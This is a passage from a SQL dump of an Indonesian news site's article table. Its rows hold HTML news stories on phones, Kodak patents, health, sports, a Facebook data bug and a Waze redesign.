14px;\">Honor 30 Lite juga memiliki jumlah kamera yang lebih banyak. Ponsel ini dibekali dengan empat kamera, terdiri dari tiga kamera belakang dengan konfigurasi 48 MP, 8 MP (ultrawide), dan 2 MP (macro), serta satu kamera depan beresolusi 16 MP. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Namun, Honor 30 Lite ditopang dengan baterai yang lebih kecil, yakni 4.000 mAh. Adapun kapasitas RAM dan media penyimpanan yang diusung sama dengan Honor X10 Max yaitu 8 GB dan 128 GB.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Untuk sektor keamanan, Honor 30 Lite juga dibekali dengan pemindai sidik jari yang diletakkan di sisi kanan. Pemindai tersebut merangkap sebagai tombol power. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Baik Honor X10 Max dan 30 Lite memiliki sejumlah fitur penunjang yang sama. Seperti jack 3,5 mm, serta sudah menjalankan sistem operasi Android 10 (versi open-source) yang dipoles dengan tampilan antarmuka khas perusahaan, Magic UI 3.1.1.&nbsp; </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sebagaimana dirangkum KompasTekno dari XDADevelopers, Jumat (3/7/2020) harga Honor 30 Lite pun tak jauh berbeda dengan X10 Max. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Honor 30 Lite tersebut hadir dalam empat varian warna (hitam, silver, pelangi, hijau) dan dijual dengan harga 1.699 yuan (6 GB/64 GB, Rp 3,4 juta), 1.899 yuan (6 GB/128 GB, Rp 3,8 juta), dan 2.199 yuan (8 GB/128 GB, Rp 4,4 juta).</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><br></p>\r\n', 'Honor 30 Lite dan Honor X10 Max Resmi Meluncur, Ini Harganya, Buruan Beli!', 'Minggu', '2020-07-07', '14:04:06', 'honor_mstore_indonesia.jpg', 7, 'teknologi', 'Y'),
(632, 36, 'admin', 'Kemungkinan Kodak Batal Jual Paten', '', '', 'kemungkinan-kodak-batal-jual-paten', 'N', 'N', 'N', '<p>New York - Kodak berencana menjual sebagian dari paten-patennya guna melindungi perusahaannya dari kebangkrutan. Namun belakangan, sang pionir di dunia fotografi ini menimbang ulang rencana tersebut.<br />\r\n<br />\r\nDilaporkan bahwa Kodak bisa jadi hanya menjual sebagian paten digital imaging yang hendak dilepas, atau malah tidak menjualnya satupun, demikian seperti dikutip detikINET dari AllThingsD, Senin (20/8/2012).<br />\r\n<br />\r\nKabar ini menyusul pemberitaan sebelumnya yang mengatakan bahwa Kodak telah menunda pengumuman hasil penjualan patennya. &quot;Kodak belum mencapai kepastian atau persetujuan untuk menjual portofolio paten digital imagingnya, &quot;ujar Kodak dalam sebuah pernyataan.<br />\r\n<br />\r\nSuara resmi tersebut menyugestikan bahwa lelang paten yang sudah berjalan tidak berjalan sesuai harapan perusahaan yang berbasis di Rochester, New York, Amerika Serikat ini.<br />\r\n<br />\r\nSebuah sumber yang mengetahui hal itu mengatakan bahwa tawaran yang datang untuk portofolio ini hanya berada di bawah angka USD 2 miliar.<br />\r\n<br />\r\nSebelumnya, Wall Street Journal pernah melaporkan bahwa tawaran awal datang dari dua konsorsium, di mana dipimpin oleh perusahaan raksasa, Google dan Apple.<br />\r\n<br />\r\nSeperti diketahui, Kodak berjuang keras menyelematkan &#39;nyawa&#39; perusahaan. Selain menjual sebagian dari 1.100 patennya, Kodak juga telah keluar dari bisnis kamera dan beralih ke digital printing serta penciptaan aplikasi-aplikasi baru di bidang tersebut.</p>\r\n', '', 'Sabtu', '2018-04-21', '23:57:24', 'kodak.jpg', 7, 'teknologi', 'Y'),
(633, 31, 'admin', 'Apakah dia mengalami Depresi? Cek Bicaranya', '', '', 'apakah-dia-mengalami-depresi-cek-bicaranya', 'N', 'N', 'N', '<p>Jakarta, Beberapa orang pandai menyembunyikan perasaan, dari luar tampak baik-baik saja meski hatinya menangis tercabik-cabik. Para ilmuwan baru-baru ini berhasil menentukan dengan tepat tingkat keparahan depresi berdasarkan cara berbicara.<br />\r\n<br />\r\nDalam penelitian yang diklaim sebagai yang terbesar di dunia tersebut, para ilmuwan menemukan bahwa cara berbicara susah dipalsukan ketika seseorang sedang depresi. Perubahan cara bicara itu bisa dipakai untuk mengukur tingkat keparahan depresi yang dialami.<br />\r\n<br />\r\nAdam Vogel, kepala Speech Neuroscience Unit di University of Melbourne mengatakan bahwa cara berbicara adalah penanda kesehatan otak yang sangat kuat. Berbagai perubahan yang terjadi pada cara berbicara bisa menunjukkan seberapa bagus otak bekerja.<br />\r\n<br />\r\n&quot;Cara berbicara orang yang sedang depresi berubah dan dipengaruhi oleh terapi yang diberikan, menjadi lebih cepat dengan jeda yang lebih pendek,&quot; kata Vogel dalam laporannya di jurnal Biological Psychiatry seperti dikutip dari Medindia, Selasa (21/8/2012).<br />\r\n<br />\r\nDalam penelitian tersebut, Vogel melakukan pengamatan terhadap 105 pasien yang sedang menjalani terapi untuk menyembuhkan depresi. Beberapa hal yang diamati antara lain waktu, nada dan intonasi bicara yang kemudian dibandingkan dengan hasil pemeriksaan psikologis.<br />\r\n<br />\r\nPara pasien diminta melakukan panggilan telepon ke sebuah mesin penjawab otomatis. Ada yang diminta berbicara apa saja, mengungkapkan perasaan dan sebagian hanya diminta untuk membaca teks supaya tidak perlu repot-reopot memikirkan mau bicara tentang apa.<br />\r\n<br />\r\n&quot;Temuan ini memungkinkan para psikolog jadi lebih fleksibel dalam memeriksa pasien dari jarak jauh, hanya dengan mendengarkan pola dan cara berbicara meski dari lokasi yang sangat jauh atau di kampung-kampung,&quot; kata James Mundt dari Centre for Psychological Consultation di Wisconsin.</p>\r\n', '', 'Minggu', '2018-04-22', '07:33:20', 'depresi.jpg', 15, 'kesehatan', 'Y'),
(634, 31, 'admin', 'Makanan Penyumbang KegemukaN', '', '', 'makanan-penyumbang-kegemukan', 'N', 'N', 'N', '<p>Jakarta - Salah satu faktor yang banyak bikin orang jadi gemuk adalah mengonsumsi makanan yang berlebihan dan salah. Untuk itu ketahui makanan apa saja yang ditemui sehari-hari dan bisa bikin gemuk.<br />\r\n<br />\r\n&quot;Yang paling banyak bikin gemuk adalah makanan dengan kandungan gula murni dan tepung,&quot; ujar dr Pauline Endang, SpGK dari FKUI, Rabu (15/8/2012).<br />\r\n<br />\r\ndr Pauline menjelaskan banyak orang yang kadang tidak suka nasi tapi ia suka mengemil. Namun sayangnya cemilan ini makanan yang manis dengan kadar gula tinggi, kadang ada telur dan menteganya sehingga kalori tinggi.<br />\r\n<br />\r\n&quot;Makanan-makanan ini tidak bikin kenyang, jadi orang yang mengonsumsi bawaannya ia ingin makan terus apalagi jika ditambah dengan makan gorengan yang kandungan lemaknya tinggi,&quot; ungkapnya.<br />\r\n<br />\r\nHal senada juga diungkapkan oleh ahli gizi dr Inge Permadhi, MS, SpGK bahwa makanan tinggi kalori, tinggi gula dan tinggi lemak bisa menyebabkan seseorang mengalami kegemukan.<br />\r\n<br />\r\n&quot;Misalnya makanan berminyak, daging yang ada gajih, mentega, margarin, makanan-makanan ini rasanya enak dan gurih sehingga bikin orang ketagihan,&quot; ujar dr Inge dari Departemen Ilmu Gizi FKUI.<br />\r\n<br />\r\nBerikut ini beberapa makanan yang diketahui bisa menyumbang kegemukan yaitu:<br />\r\n<br />\r\n1. Gorengan, mengandung banyak lemak dan juga kolesterol<br />\r\n2. Martabak, mengandung tinggi gula dan lemak<br />\r\n3. Cake, mengandung tinggi gula dan lemak<br />\r\n4. Minuman manis, mengandung tinggi gula dan kalori<br />\r\n5. Minuman soda, menyebabkan timbunan lemak visceral di perut<br />\r\n6. Kerupuk, mengandung karbohidrat dan kadar lemak yang tinggi<br />\r\n7. Es krim,mengandung tinggi gula dan lemak<br />\r\n8. Daging yang masih ada gajihnya<br />\r\n9. Fast food atau makanan cepat saji, kandungan lemak dan kalorinya tinggi tapi cenderung minim nutrisi<br />\r\n10. Keripik, kandungan lemak dan gula dari keripik ini membuat jumlah kalorinya tinggi serta ditambah dengan tinggi garam<br />\r\n11. Sereal manis, mengandung karbohidrat yang tinggi dan ditambah dengan gula yang bisa memicu penimbunan lemak<br />\r\n12. Krim-krim penambah minuman (Whipped cream), mengandung kadar lemak yang tinggi<br />\r\n<br />\r\n&quot;Kandungan dari bahan makanan ini bila asupannya melebihi kebutuhan tubuh maka akan diubah dan disimpan di dalam sel lemak dan tentu saja membuat seseorang jadi gemuk,&quot; ujar Dr Marini Siregar, MGizi, SpGK dari RS Premier Jatinegara.<br />\r\n<br />\r\nDr Marini menyarankan agar tidak menjadi gemuk yang terpenting adalah keseimbangan antara apa yang dimakan dengan aktivitas fisik yang dilakukan. Jika termasuk orang yang aktivitas fisiknya rendah, asupan makanannya harus disesuaikan tidak boleh terlalu banyak.<br />\r\n<br />\r\n&quot;Jangan lupa mengonsumsi air yang cukup agar metabolisme dalam tubuh berjalan dengan baik, serta sayuran dan buah yang mengandung serat tinggi akan membuat kita merasa lebih kenyang sehingga mengurangi asupan makanan yang lain dan tidak akan terjadi kegemukan,&quot; ujar Dr Marini.</p>\r\n', '', 'Minggu', '2018-04-22', '07:32:21', 'food-388.jpg', 11, 'kesehatan', 'Y'),
(635, 47, 'admin', 'Foto Bugil Pangeran Harry Beredar di dunia international', '', '', 'foto-bugil-pangeran-harry-beredar-di-dunia-international', 'N', 'N', 'N', '<p>Las Vegas - Pangeran Harry dari Inggris kembali membuat sensasi. Kali ini TMZ, sebuah situs hiburan Amerika Serikat, merilis foto-foto bugil adik Pangeran William itu, Selasa (21/8/2012).<br />\r\n<br />\r\nMenurut TMZ, foto itu diambil ketika putra kedua Pangeran Charles itu berpesta dengan teman-temannya di kamar hotelnya di Las Vegas, Jumat (18/8/2012).<br />\r\n<br />\r\nMengutip sumbernya, TMZ melaporkan, Harry dan teman-temannya turun ke bar hotel dan bertemu sejumlah perempuan, yang kemudian diundangnya ke kamar suite-nya di hotel itu.<br />\r\n<br />\r\nSuasana pun menjadi liar karena anak-anak muda itu mengadakan permainan biliar. Dalam aturan permainan itu, yang kalah harus melepas pakaian, sampai akhirnya semua peserta bugil.<br />\r\n<br />\r\nBeberapa orang yang hadir di pesta itu memotret kehebohan pesta tersebut. Dalam salah satu foto, tampak Harry dalam keadaan telanjang bulat dengan kedua tangan menutupi alat vitalnya. Sementara itu, foto lainnya menunjukkan Harry memeluk seorang perempuan yang juga terlihat bugil.<br />\r\n<br />\r\nKepada TMZ, Keluarga Kerajaan Inggris mengatakan, &quot;Kami tidak berkomentar tentang foto-foto itu saat ini.&quot;</p>\r\n', '', 'Minggu', '2018-04-22', '08:14:38', 'meghan-markle-dan-pangeran-harry.jpg', 30, 'internasional', 'Y'),
(636, 2, 'admin', 'Hukuman Ganda Korea Diperingan, Greysia Meiliana Tunggu Nasib', 'Buntut Pertandingan \\\"Sabun\\\" di Olimpiade London', '', 'hukuman-ganda-korea-diperingan-greysia-meiliana-tunggu-nasib', 'N', 'N', 'N', '<p>Seoul - Otoritas bulutangkis Korea Selatan, Rabu (22/8) mengurangi hukuman untuk empat pemain yang diduga sengaja kalah pada pertandingan di Olimpiade London, dari dua tahun menjadi enam bulan setelah terjadi proses banding.<br />\r\n&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\nJung Kyung-Eun, Kim Ha-Na, Ha Jung-Eun, dan Kim Min-Jung dilarang berpartisipasi di kompetisi-kompetisi domestik dan internasional selama enam bulan, demikian disampaikan oleh Asosiasi Bulutangkis Korea, Rabu.<br />\r\n&nbsp;&nbsp; &nbsp;<br />\r\nKeempat atlet itu berkata mereka hanya mengikuti perintah pelatih Sung Han-Kook, dan asisten Kim Moon-Soo. Sebelumnya, hukuman seumur hidup mereka telah dikurangi menjadi dua tahun.<br />\r\n&nbsp;&nbsp; &nbsp;<br />\r\nDelapan pebulutangkis ganda putri, dari Korea Selatan, Indonesia, dan China didiskualifikasi dari Olimpiade karena sengaja mengalah agar dapat mengamankan posisi yang lebih menguntungkan di babak berikutnya.<br />\r\n&nbsp;&nbsp; &nbsp;<br />\r\nSkandal ini membuat bintang bulutangkis China, Yu Yang, pensiun dari bulutangkis.<br />\r\n&nbsp;&nbsp; &nbsp;<br />\r\nPresiden Federasi Bulutangkis Dunia, Kang Young-Joong, telah menepis rumor bahwa publikasi yang buruk dari olahraga ini dapat membahayakan masa depan bulutangkis di Olimpiade.<br />\r\n&nbsp;&nbsp; &nbsp;<br />\r\nKorea Selatan mendapat satu medali perunggu dari cabang olahraga bulutangkis di London - itu merupakan penampilan terburuk sepanjang partisipasi mereka di Olimpiade.<br />\r\n<br />\r\nSementara di Indonesia, PBSI akhirnya memutuskan akan menjatuhkan sanksi kepada dua pemain ganda putri andalannya, Greysia Polii dan Meiliana Jauhari. Seperti diketahui, Greysia/Meiliana harus didiskualifkasi dari Olimpiade London 2012 karena diduga sengaja mengalah pada penyisihan grup untuk menghindari lawan berat di babak perempat final.<br />\r\n&nbsp;<br />\r\nBadminton World Federation (BWF) memutuskan Greysia/Meiliana dan lawannya, Ha Jung Eun/Kim Min Jung dari Korea didiskualifikasi dari turnamen paling bergengsi tersebut. Pasangan terkuat dunia asal China, Wang Xiaoli/Yu Yang dan Kim Ha Na/Jung Kyung Eun dari Korea juga terkena diskualifikasi.<br />\r\n<br />\r\n&ldquo;Kami tak mau dipengaruhi oleh keputusan yang diambil oleh Korea atau China, karena setiap organisasi memiliki kebijakan masing-masing. Walaupun demikian, kami menghargai IOC dan BWF yang telah memutuskan bahwa Greysia/Meiliana bersalah, hal ini tidak boleh terulang lagi kedepannya. PBSI akan memberikan sanksi, namun belum bisa diumumkan bentuk sankisnya seperti apa&rdquo; ujar Sekjen PBSI, Yacob Rusdianto di Pelatnas Cipayung, Selasa (21/8) sepersti dikutip situs PBSI.<br />\r\n&nbsp;<br />\r\nSaat ini PBSI masih dalam proses diskusi mengenai sanksi yang akan diberikan kepada Greysia/Meiliana dan belum ada keputusan serta pemberitahuan resmi kepada keduanya. Namun ia mengaku telah beberapa kali mengadakan pertemuan kekeluargaan bersama kedua pemain untuk membicarakan masalah ini dan kemungkinan-kemungkinan yang akan terjadi.</p>\r\n', 'Suasana pertandingan memalukan itu.', 'Senin', '2019-07-15', '06:59:37', '', 10, 'olahraga', 'Y'),
(637, 2, 'admin', 'Zeelenberg: Lorenzo Akan Bangkit melawan di Brno', 'MotoGP', '', 'zeelenberg-lorenzo-akan-bangkit-melawan-di-brno', 'N', 'N', 'N', '<p>London - Setelah harus bekerja keras merebut posisi kedua di Indianapolis, Manajer tim Yamaha, Wilco Zeelenberg, yakin pebalap Jorge Lorenzo akan bangkit di MotoGP seri Ceko.</p>\r\n\r\n<p>Lorenzo diyakini dapat tampil sebagai pemenang untuk menjaga posisi tertinggi di klasemen sementara. &quot;Sirkuit Indianapolis menyulitkan kami saat start. Namun, Sirkuit Brno memiliki lintasan yang halus dan cepat. Saya yakin kami dapat tampil lebih baik di sana,&quot; kata Zeelenberg, London, Rabu (22/8/2012) di London.</p>\r\n\r\n<p>Lorenzo menang di Brno pada musim 2010 tetapi finis keempat di musim 2011. Lorenzo akan berusaha merebut kemenangan keenam pada musim ini di Brno.</p>\r\n\r\n<p>Kemenangan ini penting bagi Lorenzo untuk memastikan langkahnya menjadi juara dunia di musim ini. Jika sampai kalah dari Dani Pedrosa, gelar juara dunia harus ditentukan sampai lomba di akhir musim</p>\r\n', 'Pebalap Yamaha, Jorge Lorenzo, dengan motor Jupiter Z1 di paddock Yamaha. ', 'Minggu', '2018-04-22', '10:57:39', 'jorge-lorenzo.jpg', 9, 'olahraga', 'Y'),
(638, 2, 'admin', 'Tyson Peringatkan Rapper 50 Cent untuk Diam', '', '', 'tyson-peringatkan-rapper-50-cent-untuk-diam', 'N', 'N', 'N', '<p>New York - Mantan juara dunia tinju kelas berat Mike Tyson memperingatkan rapper 50 Cent yang kini bertindak sebagai promotor tinju.<br />\r\n<br />\r\nRapper yang bernama asli Curtis Jackson ini baru saja mendirikan The Money Team (TMT) Promotions bersama petinju legendaris AS lainnya, Floyd Mayweather Jr. TMT bergerak di bidang pertandingan tinju profesional.<br />\r\n<br />\r\nSaat mendirikan perusahaan ini, 50 Cent bermaksud melakukan perubahan mendasar pada olahraga tinju profesional di AS.<br />\r\n<br />\r\nNamun, Tyson yang pernah malang melintang di dunia tinju antara 1985 hingga 2005 ini memperingatkan 50 Cent tentang &quot;kotornya&quot; dunia tinju profesional.<br />\r\n<br />\r\n&quot;Anda harus tahu tentang dunia tinju. Ini merupakan bisnis yang legal, tetapi tidak semua berjalan terbuka,&quot; kata Tyson. &quot;Memang seharusnya bisnis ini dikelola pemerintah.&quot;<br />\r\n<br />\r\n&quot;50 (Cent) adalah seorang bintang rap, penghibur, dan enterpreneur. Namun, ia sama sekali tidak mengerti dunia tinju,&quot; lanjut juara dunia tinju kelas berat 1986-1990 ini.<br />\r\n<br />\r\nMenurut Tyson, pengetahuan tentang tinju diperoleh 50 Cent hanya versi dari Floyd Mayweather.&nbsp; &quot;Begitu dia berkecimpung di dunia ini, ia harus tahu bahwa kawan bisa menjadi lawan,&quot; kata Tyson. &quot;Mereka hanya inginkan uang Anda dan ingin terus menguasai dunia ini.&quot;<br />\r\n<br />\r\n50 Cent mendapatkan izin promotornya di New York pada Juli lalu, dan mendapat izin usahanya di Nevada. Saat ini mereka telah mengikat beberapa petinju potensial, seperti petinju kelas bulu Yuriorkis Gamboa dari Kuba dan Billy Dib dari Australia.</p>\r\n', 'Mike Tyson', 'Minggu', '2018-04-22', '10:56:30', 'mike-tyson.jpg', 8, 'olahraga', 'Y');
INSERT INTO `berita` (`id_berita`, `id_kategori`, `username`, `judul`, `sub_judul`, `youtube`, `judul_seo`, `headline`, `aktif`, `utama`, `isi_berita`, `keterangan_gambar`, `hari`, `tanggal`, `jam`, `gambar`, `dibaca`, `tag`, `status`) VALUES
(639, 23, 'mstore', 'Pengalaman Main Game Mobile di Indonesia Mendapat Nilai Buruk', '', 'https://www.youtube.com/watch?v=3-x1YY1bXoE', 'pengalaman-main-game-mobile-di-indonesia-mendapat-nilai-buruk', 'N', 'N', 'N', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Sekitar 85 persen populasi pengguna internet di Indonesia disebut aktif bermain game mobile. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Meski demikian, hal tersebut tak diiringi dengan pengalaman mobile gaming yang ternyata masih belum memuaskan. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Hal tersebut diungkapkan dalam laporan terbaru dari lembaga riset OpenSignal berjudul \"Mobile Games Experience in Indonesian Cities\". </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Riset ini merangkum pengalaman bermain game mobile di 44 kota besar di Indonesia dengan range skor 0 hingga 100 poin dalam periode 29 Februari hingga 29 Mei 2020. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Riset ini melibatkan para pemain game mobile dengan sejumlah judul game populer seperti PUBG Mobile, Call of Duty Mobile, serta game bergenre MOBA.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Berdasarkan riset tersebut, Palangkaraya, Pekanbaru dan Banda Aceh merupakan tiga kota teratas yang masuk dalam kategori \"Fair\" (wajar), dengan masing-masing skor 71,9, 71,1, dan 70,1 poin. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Ini berarti mayoritas pengguna melaporkan pengalaman bermain game yang dinilai cukup atau lumayan nyaman. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dalam kategori ini ada 18 kota lainnya, di mana beberapa di antaranya merupakan kota-kota padat penduduk seperti Tangerang Selatan (67,9), Medan (67,8), Bekasi (66,4) dan Jakarta (65,6). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Di bawah fair, ada kategori \"Poor\" (buruk) yang memuat sebanyak 23 kota lainnya (dari 44 kota). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Jika sebuah kota masuk kategori ini, maka mayoritas pengguna di kota tersebut merasakan pengalaman bermain game dengan jaringan seluler yang buruk.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Beberapa kota tersebut berada pada kisaran skor 40-65 poin, seperti Jambi (64,9), diikuti dengan kota besar seperti Bandung (62,9) dan Surabaya (58,8). Grafik skor berdasarkan kota secara lengkap bisa dilihat pada gambar di atas. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><b>Pengalaman bermain game masih buruk </b></span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Jika mengamati skor yang diperoleh setiap kota, pengalaman bermain game di Indonesia bisa dibilang memang belum memuaskan. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Apalagi, fair dan poor merupakan dua dari tiga kategori terbawah yang yang dibuat OpenSignal (dari lima kategori). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Kelima kategori pengalaman bermain game online yang dikelompokkan OpenSignal, mencakup \"Excellent\" (85 poin ke atas), \"Good\" (75-85 poin), \"Fair\" (65-75 poin), \"Poor\" (40-65 poin), dan \"Very Poor\" (di bawah 40 poin). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Nah, untuk mengukur pengalaman bermain game mobile secara akurat, OpenSignal sendiri memantau tiga metrik utama ketika pengguna bermain sejumlah game online populer. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Adapun ketiga metrik yang diukur mencakup tingkat responsivitas jaringan (latency), besar data yang tidak dikirimkan ke server/hilang (packet loss), hingga variabel waktu yang diperlukan untuk mentransfer data dari client ke server (jitter). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Laporan OpenSignal selengkapnya terkait pengalaman mobile game di Indonesia bisa ditelisik di tautan <a href=\"https://www.opensignal.com/2020/06/25/indonesias-top-cities-on-mobile-games-experience-palangka-raya-pekanbaru-and-banda-aceh\" target=\"_blank\">berikut</a>.</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><br></p>\r\n', 'Pengalaman Main Game Mobile di Indonesia Mendapat Nilai Buruk, kok bisa? mari simak ulasannya!', 'Minggu', '2020-07-07', '17:11:01', 'pengalaman_game_mstore_indonesia.jpg', 10, 'selebritis', 'Y'),
(640, 23, 'mstore', 'Bug di Facebook Bikin Ribuan Pengembang Bisa Akses Data Pengguna', '', 'https://www.youtube.com/watch?v=MbId6X-J7fM', 'bug-di-facebook-bikin-ribuan-pengembang-bisa-akses-data-pengguna', 'N', 'N', 'N', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Raksasa jejaring sosial, Facebook, mengakui bahwa pihaknya menemukan ribuan pengembang aplikasi pihak ketiga yang berhasil mengakses data pengguna dalam periode tertentu.  </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Para pengembang tersebut berhasil mendapatkan data-data pengguna meski pengguna tersebut sudah tidak aktif di Facebook selama lebih dari 90 hari.  </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Menurut pihak Facebook, hal tersebut disebabkan oleh adanya bug. Informasi data pribadi pengguna yang berhasil dilihat oleh pengembang mencakup alamat e-mail, tanggal lahir, bahasa, usia, dan jenis kelamin. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Hal tersebut bertentangan dengan regulasi yang diterapkan oleh Facebook sejak 2018 lalu. Dalam regulasi tersebut, dikatakan bahwa pengembang aplikasi pihak ketiga, tidak akan bisa mendapatkan data pengguna yang sudah tidak aktif selama 90 hari \"Kami menemukan bahwa dalam beberapa kasus, aplikasi terus menerima data pengguna Meskipun tampaknya mereka tidak aktif dalam 90 hari terakhir,\" kata Konstantinos Papamiltiadis, Wakil Presiden Platform Partnership Facebook. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sejauh ini, Facebook pun belum membeberkan secara detail, berapa jumlah pengguna yang terdampak atas kebocoran data pribadi tersebut. Namun, Facebook memastikan bahwa masalah ini telah ditangani dan diselidiki oleh perusahaan. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Setelah menemukan temuan ini, kami telah memperbaiki masalah tersebut. Kami juga akan terus menyelidiki dan memprioritaskan pengguna kami secara transparan,\" ungkap Papamiltiadis. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dihimpun MstoreBlog dari Tech Crunch, Senin (6/7/2020), kejadian ini mengingatkan kembali pada skandal Cambridge Analytica yang terjadi 2018 lalu. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Setelah skandal tersebut terungkap, Facebook menetapkan pedoman baru untuk mencegah pengembang menerima data dari pengguna yang tidak aktif selama lebih dari 90 hari. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Apabila pengembang ingin mengakses data, Facebook mengharuskan mereka untuk meminta izin terlebih dahulu kepada pengguna yang bersangkutan.</span><br></p>\r\n', '\"Bug\" di Facebook Bikin Ribuan Pengembang Bisa Akses Data Pengguna, Mari Kita Simak Ulasannya!', 'Minggu', '2020-07-07', '16:13:57', 'facebook_mstore_indonesia.jpg', 16, 'selebritis', 'Y'),
(641, 23, 'mstore', 'Dirombak, Tampilan Waze Kini Lebih Warna-warni', '', 'https://www.youtube.com/watch?v=034BWqx-TAM', 'dirombak-tampilan-waze-kini-lebih-warnawarni', 'N', 'N', 'N', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Aplikasi navigasi berbasis komunitas, Waze, baru saja merombak tampilan aplikasinya. Setelah diperbarui, Waze menjadi tampak lebih segar dengan warna-warna cerah. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Selain merombak tampilan, Waze merilis identitas label baru dan fitur Moods. Pembaruan ini hadir secara global, termasuk di Indonesia. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Fitur Moods akan merepresentasikan suasana hati pengguna saat mengemudi yang diwakili ikon dengan beragam ekspresi dan warna. Mulai dari ekspresi bahagia, bebas, mengantuk, atau lain sebagainya. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Mood dapat merefleksikan suasana hati kita saat berkendara, dan warna menggairahkan merayakan keceriaan yang selalu kami coba bawa ke jalan,\" kata Marlin R. Siahaan, Country Manager Waze Indonesia.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Total ada 30 ikon Mood. Selain adanya ikon Mood, Waze juga mendesain antarmuka peta jalan dengan sistem blok, memperbarui ikon laporan, logo, dan juga tipografi. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Kami ingin membangun identitas visual yang kuat dan fleksibel, yang akan mendukung brand dan penggunanya, memungkinkan mereka untuk mengekspresikan diri secara otentik,\" jelas Marlin dalam keterangan tertulis yang diterima KompasTekno, Kamis (2/7/2020). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Pembaruan ini bertepatan dengan dimulainya kembali aktivitas luar ruangan di beberapa wilayah di Indonesia, paska pemberlakuan Pembatasan Sosial Berskala Besar (PSBB). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Waze berharap tampilan baru ini bisa membantu masyarakat Indonesia untuk beradaptasi dengan kelaziman baru (new normal). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Meskipun kita harus beraktivitas kembali di jalan, kita tetap harus menjaga kebersihan dan kesehatan dalam situasi new normal ini, menggunakan masker dan membawa cairan pembersih tangan saat keluar rumah adalah suatu keharusan,\" imbuh Marlin.</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><br></p>\r\n', 'Dirombak, Tampilan Waze Kini Lebih Warna-warni, Simak Usalannya!', 'Minggu', '2020-07-07', '16:12:20', 'waze_mstore_indonesia.png', 9, 'selebritis', 'Y'),
